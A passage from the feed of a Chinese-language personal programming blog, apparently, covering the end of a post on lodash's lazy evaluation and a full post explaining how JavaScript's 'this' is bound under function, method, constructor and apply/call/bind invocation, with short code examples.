class=&quot;params&quot;&gt;x&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;item&lt;/span&gt;) &lt;/span&gt;&amp;#123; &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; item.price &amp;lt; x; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;var&lt;/span&gt; gems = [&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &amp;#123; &lt;span class=&quot;attribute&quot;&gt;name&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&#39;Sunstone&#39;&lt;/span&gt;, &lt;span class=&quot;attribute&quot;&gt;price&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; &amp;#125;, &amp;#123; &lt;span class=&quot;attribute&quot;&gt;name&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&#39;Amethyst&#39;&lt;/span&gt;, &lt;span class=&quot;attribute&quot;&gt;price&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;15&lt;/span&gt; &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &amp;#123; &lt;span class=&quot;attribute&quot;&gt;name&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&#39;Prehnite&#39;&lt;/span&gt;, &lt;span class=&quot;attribute&quot;&gt;price&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;&amp;#125;, &amp;#123; &lt;span class=&quot;attribute&quot;&gt;name&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&#39;Sugilite&#39;&lt;/span&gt;, &lt;span class=&quot;attribute&quot;&gt;price&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;  &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &amp;#123; &lt;span class=&quot;attribute&quot;&gt;name&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&#39;Diopside&#39;&lt;/span&gt;, &lt;span class=&quot;attribute&quot;&gt;price&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; &amp;#125;, &amp;#123; &lt;span class=&quot;attribute&quot;&gt;name&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&#39;Feldspar&#39;&lt;/span&gt;, &lt;span class=&quot;attribute&quot;&gt;price&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt; &amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &amp;#123; &lt;span class=&quot;attribute&quot;&gt;name&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&#39;Dioptase&#39;&lt;/span&gt;, &lt;span class=&quot;attribute&quot;&gt;price&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &amp;#125;, &amp;#123; &lt;span class=&quot;attribute&quot;&gt;name&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&#39;Sapphire&#39;&lt;/span&gt;, &lt;span class=&quot;attribute&quot;&gt;price&lt;/span&gt;: &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;var&lt;/span&gt; chosen = _(gems).filter(priceLt(&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)).take(&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;).value();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;它的运行示意图是:&lt;br&gt;&lt;img src=&quot;/2015/12/25/lodash/lodash-naive.gif&quot; alt=&quot;lodash-naive.gif&quot; title=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;上面一共读取了8个元素，然后我们取出我们需要的3个元素。不难发现，其实我们只需要读取前5个元素，就能找到我们想要的那3个结果。那么它原本应该的结果应该是:&lt;/p&gt;
&lt;img src=&quot;/2015/12/25/lodash/grafika.gif&quot; alt=&quot;grafika.gif&quot; title=&quot;&quot;&gt;
&lt;p&gt;那么延迟计算的特点在于，它将我们在链式执行筛选函数的条件都延迟到最后一个筛选条件一并执行(这些筛选条件必须连续)，这个有点类似于浏览器对repaint/reflow的优化所干的事。&lt;br&gt;上面代码用伪代码就可以近似表示为:&lt;/p&gt;
&lt;figure class=&quot;highlight hsp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var takeNum = &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, result = []&lt;span class=&quot;comment&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(var i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, len = gems.&lt;span class=&quot;keyword&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;; i &amp;lt; len; i++) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(priceLt(gems[i])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		reuslt.push(gems[i])&lt;span class=&quot;comment&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(reuslt.&lt;span class=&quot;keyword&quot;&gt;length&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;comment&quot;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;关于lodash延迟计算的一些讲解，我觉得&lt;a href=&quot;http://filimanjaro.com/blog/2014/introducing-lazy-evaluation/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;How to Speed Up Lo-Dash ×100? Introducing Lazy Evaluation.&lt;/a&gt;这篇文章讲的很有意识，作者的语言和理解比较易懂。&lt;/p&gt;
&lt;h2 id=&quot;结语&quot;&gt;&lt;a href=&quot;#结语&quot; class=&quot;headerlink&quot; title=&quot;结语&quot;&gt;&lt;/a&gt;结语&lt;/h2&gt;&lt;p&gt;其实也可以挑一些有特点的api来适当的说明下lodash的api上的特点，但是个人觉得再怎么将还不如翻一翻官方文档，之前也说到了lodash的官方文档带给我的感受了。&lt;br&gt;在知乎上，很多大牛都觉的underscore的源码很是值得一读和重新实现，但现在觉得lodash的源码更是值得细细专研下(未压缩版的lodash源码的注释意识十分详细)。代码规范、如何实现延迟计算、函数式编程的思想，学以致用的最高境界也当要学透。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;如果你曾经使用过&lt;strong&gt;underscore&lt;/strong&gt;,那么你一定会喜欢今天我要介绍的&lt;strong&gt;lodash&lt;/strong&gt;。&lt;br&gt;&lt;img src=&quot;/2015/12/25/lodash/lodash.png&quot; alt=&quot;lodash.png&quot; title=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="http://summerGreenTea.github.io/tags/javascript/"/>
    
      <category term="tools" scheme="http://summerGreenTea.github.io/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>javascript中的this指向问题</title>
    <link href="http://summerGreenTea.github.io/2015/12/25/javascript-this/"/>
    <id>http://summerGreenTea.github.io/2015/12/25/javascript-this/</id>
    <published>2015-12-25T11:25:27.000Z</published>
    <updated>2016-03-02T07:25:49.521Z</updated>
    
    <content type="html">&lt;p&gt;Javascript中的this指向问题应该算是前端面试中最喜欢被问到的问题之一吧！网上相关的文章数不胜数，做为前端新人，自己也稍微的扯下对Javascript中this的指向的一些理解和总结吧！&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;当调用一个函数时，这个函数会附加的接受两个参数:arguments(本文不做介绍)和this，大多关于讲解this的文章都是要么说浅了，只是举几个例子就完事了;要么就是说深了，让人看完云里雾里的。我觉得要理入Javascript的this的指向问题，就一定要说到函数的四种调用模式。&lt;/p&gt;
&lt;h3 id=&quot;函数调用&quot;&gt;&lt;a href=&quot;#函数调用&quot; class=&quot;headerlink&quot; title=&quot;函数调用&quot;&gt;&lt;/a&gt;函数调用&lt;/h3&gt;&lt;p&gt;当我们函数只是做为一个函数被调用的时候，函数调用时其内部的this指向(绑定)的是window对象。这个在Javascript被设计之初就被认为是这门语言的一个设计错误。在ES6中，我们可以通过箭头函数来讲函数中的this绑定为函数定义时的上下文。&lt;br&gt;&lt;figure class=&quot;highlight typescript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;call_with_function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;call_with_&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;//window&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;我们再来看个例子:&lt;br&gt;&lt;figure class=&quot;highlight qml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;var&lt;/span&gt; message = &lt;span class=&quot;string&quot;&gt;&#39;window message&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;var&lt;/span&gt; log = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;message&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&#39;log message:&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;output&lt;/span&gt;: &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		setTimeout(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.message);	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;, &lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// &quot;window message&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;结果为&lt;code&gt;window message&lt;/code&gt;,这个是很多新手都会犯的一个低级失误，&lt;code&gt;setTimeout&lt;/code&gt;中的回调函数给人的感觉是通过&lt;code&gt;log.output()&lt;/code&gt;方法来调用的，那么在这个方法中，this的指向应该是log。其实不然，我们再深入一步去查看代码会发现，this是在&lt;code&gt;setTimeout&lt;/code&gt;中的回调函数中被调用的，也就是说，这种是函数调用模式，所以其中的this应该是指向window全局对象。&lt;br&gt;我们可以通过ES6的箭头函数以及后面要讲到的ES5的bind方法来实现原先想要实现的效果:&lt;br&gt;&lt;figure class=&quot;highlight qml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;var&lt;/span&gt; message = &lt;span class=&quot;string&quot;&gt;&#39;window message&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;var&lt;/span&gt; log = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;message&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&#39;log message:&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;output&lt;/span&gt;: &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		setTimeout(() =&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.message);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;, &lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;log.output()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// &quot;log message&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;方法调用模式&quot;&gt;&lt;a href=&quot;#方法调用模式&quot; class=&quot;headerlink&quot; title=&quot;方法调用模式&quot;&gt;&lt;/a&gt;方法调用模式&lt;/h3&gt;&lt;p&gt;在上面的例子中，&lt;code&gt;output&lt;/code&gt;是log对象的一个属性，它的值是一个函数表达式，通过&lt;code&gt;log.output()&lt;/code&gt;可以执行这个函数表达式所代表的函数，我们把这种函数叫做对象的方法。&lt;br&gt;显然，通过对象调用的方法，其执行时所绑定的this是指向调用这个方法的对象。还是以上面那个例子来说明下:&lt;br&gt;&lt;figure class=&quot;highlight qml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;var&lt;/span&gt; message = &lt;span class=&quot;string&quot;&gt;&#39;window message&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;var&lt;/span&gt; log = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;message&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&#39;log message:&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;output&lt;/span&gt;: &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.message);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;log.output()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// &quot;log message&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;个人觉得，这种调用模式是最好理解的，所以点到为止。&lt;/p&gt;
&lt;h3 id=&quot;构造函数调用模式&quot;&gt;&lt;a href=&quot;#构造函数调用模式&quot; class=&quot;headerlink&quot; title=&quot;构造函数调用模式&quot;&gt;&lt;/a&gt;构造函数调用模式&lt;/h3&gt;&lt;p&gt;构造函数调用在写法上只是在函数调用的基础上加了&lt;code&gt;new&lt;/code&gt;关键字，并用变量接受返回的对象。我们可以说一说我们在构造函数前面使用new关键字的作用就能明白其内部的this指向是谁了。&lt;br&gt;当使用new关键字时:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;创建一个新对象&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;将构造函数的作用域赋给新对象&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;执行构造函数中的代码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;返回新对象&lt;br&gt;简单来说就是使用new关键字会将构造函数的prototype连接到这个新对象上，并把this指向这个对象。要想理解这几个步骤，就要对作用域的相关知识有所了解，可以自行谷歌。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;apply、call、bind调用模式&quot;&gt;&lt;a href=&quot;#apply、call、bind调用模式&quot; class=&quot;headerlink&quot; title=&quot;apply、call、bind调用模式&quot;&gt;&lt;/a&gt;apply、call、bind调用模式&lt;/h3&gt;&lt;p&gt;Javascript的函数存在&lt;strong&gt;定义时上下文&lt;/strong&gt;、&lt;strong&gt;执行时上下文&lt;/strong&gt;和&lt;strong&gt;函数上下文可改变&lt;/strong&gt;的特征。而&lt;code&gt;apply、call、bind&lt;/code&gt;这正是利用了函数上下文可改变的特点来给函数内部的this绑定指定对象。&lt;br&gt;&lt;figure class=&quot;highlight qml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;var&lt;/span&gt; message = &lt;span class=&quot;string&quot;&gt;&#39;window message&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;var&lt;/span&gt; log = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;message&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&#39;log message:&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;attribute&quot;&gt;output&lt;/span&gt;: &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;tip1, tip2, tip3&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(tip1 + tip2 + tip3 + &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.message);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;log.output.apply(&lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;, [&lt;span class=&quot;string&quot;&gt;&#39;this &#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;is &#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;from &#39;&lt;/span&gt;])  &lt;span class=&quot;comment&quot;&gt;// &quot;this is from window message&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;log.output.call(&lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;this &#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;is &#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;from &#39;&lt;/span&gt;)  &lt;span class=&quot;comment&quot;&gt;// &quot;this is from window message&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;上面两个例子中output内部的this的指向被我们分别使用apply和call改变了，它们的第一个参数是要绑定给this的值。apply的第二个参数是一个参数数组，是一个要传给调用apply的函数的参数数组。而call是从第二个参数开始的参数就是依次要传入给调用call函数的参数列表。&lt;br&gt;我们要要提到的是ES5函数的bind()方法，它返回一个绑定this到指定对象的新函数，它的第一个参数和apply和call一样，都是要给this绑定的值，后面的参数是要结合新函数所传入的参数一起传入到绑定bind()的函数中。说起来有点绕口，但是理解并不难。它的一个很重要的特征是它返回一个绑定了this的新函数而不是像call和apply一样，绑定并执行。&lt;/p&gt;
&lt;h3 id=&quot;结语&quot;&gt;&lt;a href=&quot;#结语&quot; class=&quot;headerlink&quot; title=&quot;结语&quot;&gt;&lt;/a&gt;结语&lt;/h3&gt;&lt;p&gt;其实要在某个场景下要分辨出当前的this指向的对象是什么，我们只需要仔细的分析下代码，然后找出这个this所在的函数的调用放失是什么就能很好的理解了。其实，这些点并不需要去记忆，结合Javacript的其他知识体系能帮我们更好的掌握这个知识点，说不定还有其他的很多收获。&lt;br&gt;整片文章是以理论体系为主，并没有结合大量的例子来说明，如果有同学或前辈觉得我在某些说法上有错误或不妥的话，欢迎留言。~~Thanks。&lt;/p&gt;
</content>
    
    <summary type="html">
    
